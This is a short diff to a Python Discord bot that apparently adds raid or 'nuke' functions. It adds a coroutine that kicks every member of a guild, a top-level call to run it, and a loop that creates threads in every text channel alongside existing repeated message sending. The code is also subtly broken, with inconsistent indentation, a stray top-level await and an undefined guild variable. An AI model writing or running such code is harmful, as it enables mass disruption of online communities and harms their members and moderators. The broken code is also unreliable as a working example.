@@ -7,4 +7,22 @@ async def send_message(channel):
         await channel.send(message_content)
         await asyncio.sleep(1)  #
 
-#
+# kick_members
+async def kick_members():
+        for member in guild.members:
+            try:
+                await member.kick()
+                print(f'Kicked member: {member.name}')
+            except discord.Forbidden:
+                print(f'Failed to kick member: {member.name}')
+                
+#await (if you need it)
+ await kick_members()  
+                
+#create_thread
+ async def create_threads():
+        for guild in client.guilds:
+            for channel in guild.text_channels:
+                await create_thread(channel)
+                await asyncio.sleep(1)
+
